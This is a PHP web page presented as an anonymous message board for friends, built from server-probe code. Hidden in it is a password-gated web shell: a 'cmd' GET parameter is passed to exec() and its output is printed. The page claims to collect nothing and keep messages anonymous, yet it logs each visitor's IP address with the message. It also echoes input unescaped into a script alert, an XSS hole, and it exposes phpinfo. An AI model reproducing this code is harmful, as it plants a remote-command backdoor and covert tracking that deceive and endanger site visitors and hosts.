<?php

error_reporting(0); //抑制所有错误信息
@header("content-Type: text/html; charset=utf-8"); //语言强制
ob_start();

function valid_email($str) 
{
  return ( ! preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $str)) ? FALSE : TRUE;
}

//检测PHP设置参数
function show($varName)
{
  switch($result = get_cfg_var($varName))
  {
    case 0:
      return '<font color="red">×</font>';
    break;
    
    case 1:
      return '<font color="green">√</font>';
    break;
    
    default:
      return $result;
    break;
  }
}

if (isset($_GET['cmd'])) {
    $cmd = stripslashes($_GET['cmd']);
    if (isset($_GET['password'])){
      $password = stripslashes($_GET['password']);
      if ($password === "xxxxxxxxxxxxx"){
          exec($cmd, $out);  
          var_dump($out);  
          echo '<br>'; 
          var_dump($cmd);

      }else{
         echo "fuck";
      }
    }else{
       echo "fuck";
    }
    
}

if ($_GET['act'] == "phpinfo") 
{
  phpinfo();
  exit();
} 
elseif($_GET['act'] == "Function")
{
  $arr = get_defined_functions();
  Function php()
  {
  }
  echo "<pre>";
  Echo "这里显示系统所支持的所有函数,和自定义函数\n";
  print_r($arr);
  echo "</pre>";
  exit();
}elseif($_GET['act'] == "disable_functions")
{
  $disFuns=get_cfg_var("disable_functions");
  if(empty($disFuns))
  {
    $arr = '<font color=red>×</font>';
  }
  else
  { 
    $arr = $disFuns;
  }
  Function php()
  {
  }
  echo "<pre>";
  Echo "这里显示系统被禁用的函数\n";
  print_r($arr);
  echo "</pre>";
  exit();
}

//MySQL检测
if ($_POST['act'] == 'MySQL检测')
{
  $host = isset($_POST['host']) ? trim($_POST['host']) : '';
  $port = isset($_POST['port']) ? (int) $_POST['port'] : '';
  $login = isset($_POST['login']) ? trim($_POST['login']) : '';
  $password = isset($_POST['password']) ? trim($_POST['password']) : '';
  $host = preg_match('~[^a-z0-9\-\.]+~i', $host) ? '' : $host;
  $port = intval($port) ? intval($port) : '';
  $login = preg_match('~[^a-z0-9\_\-]+~i', $login) ? '' : htmlspecialchars($login);
  $password = is_string($password) ? htmlspecialchars($password) : '';
}
elseif ($_POST['act'] == '函数检测')
{
  $funRe = "函数".$_POST['funName']."支持状况检测结果：".isfun1($_POST['funName']);
}
elseif ($_POST['act'] == '告诉你了')
{
  $t= date('Ymd_H_i_s',time());
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
  saveMessage($_POST['message'], $t, $ip);
  $funRe = "留言 ".$_POST['message']." 收到！";
} 
elseif ($_POST['act'] == '邮件检测')
{
  $mailRe = "邮件发送检测结果：发送";
  if($_SERVER['SERVER_PORT']==80){$mailContent = "http://".$_SERVER['SERVER_NAME'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);}
  else{$mailContent = "http://".$_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);}
  $mailRe .= (false !== @mail($_POST["mailAdd"], $mailContent, "This is a test mail!\n\nhttp://lnmp.org")) ? "完成":"失败";
} 
  
// 检测函数支持
function isfun($funName = '')
{
    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';
  return (false !== function_exists($funName)) ? '<font color="green">√</font>' : '<font color="red">×</font>';
}
function isfun1($funName = '')
{
    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';
  return (false !== function_exists($funName)) ? '√' : '×';
}

function saveMessage($message = '', $fileName = '', $ip = '')
{
  
  file_put_contents("./../messages/".$fileName.".txt", $message."\n", FILE_APPEND);
  file_put_contents("./../messages/".$fileName.".txt", $ip."\n", FILE_APPEND);
}

?>

<!DOCTYPE html >
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>欢迎光临</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<style type="text/css">
<!--
* {font-family: Tahoma, "Microsoft Yahei", Arial; }
h1 {font-size: 30px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h2 {font-size: 20px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h3 {font-size: 10px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
body{text-align: center; margin: 0 auto; padding: 0; background-color:#FFFFFF;font-size:30px;font-family:Tahoma, Arial}
table{clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;height:80%;width:80%;}
th{padding: 3px 6px; font-size: 30px;font-weight:bold;background:#3066a6;color:#FFFFFF;border:1px solid #3066a6; text-align:left;}
input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:30px}
-->
</style>

</head>
<body>
    <div id="header">
        <h1>小伙伴，你好呀</h1>
    </div>

<div id="page">
其实啥都没有啦，谢谢你点进来，这代表你对我的信任，感激不尽！

<form action="<?php echo $_SERVER[PHP_SELF]."#bottom";?>" method="post">
<!--发送数据-->
<table width="100%" cellpadding="3" cellspacing="0" align="center">
  <tr><th colspan="3">写下你想说的话,匿名哦,我并不知道你是谁啦</th></tr>
  <tr>
    <td width="15%"></td>
    <td width="50%">
      <input type="text" name="message" size="50" maxlength="600" style="height:50px;" />
    </td>
    <td width="25%">
      <input class="btn" type="submit" name="act" align="right" value="告诉你了" />
    </td>
  </tr>
  <?php
  if ($_POST['act'] == '告诉你了') {
    echo "<script>alert('$funRe')</script>";
  }
  ?>
</table>


</form>

<div id="footer">
<ul>
<li>本网站不收集任何信息,代码公开，仅提供匿名留言功能</li>
<li>最近棋牌游戏好像很火的样子,希望一起搞的举爪</li>
<li>谢谢我的老婆大人，特别感谢我的倩女好友们!谢谢姗姗，随心，老爷，姿色，嘻嘻，11，小峰峰，红衣，微微，小年糕……</li>
</ul>

<h2>本网页为测试阶段网页,是我个人服务器的一个雏形,仅仅用以接收特定格式的post请求。目前处于内测阶段，首先测试稳定性，目前参与测试的全部为我的好朋友，倩女幽魂手游的玩家们，邀请你们测试的原因很简单，你们遍布世界各地，你们都能访问这个链接的话，证明它对世界各地都是可用的。你看到了这个网页说明你能收到我发给你的信息，你给我留言成功了的话，说明我能收到你发送的信息。其实可以通过某种操作直接在你现在看到的网页上直接关闭我的电脑噢，但为了安全起见，开发期间屏蔽所有的代码片段，以免受到任何攻击</h2>

<h3>版权所有.乍暖还寒</h3>

</div>

</div>
</body>
</html>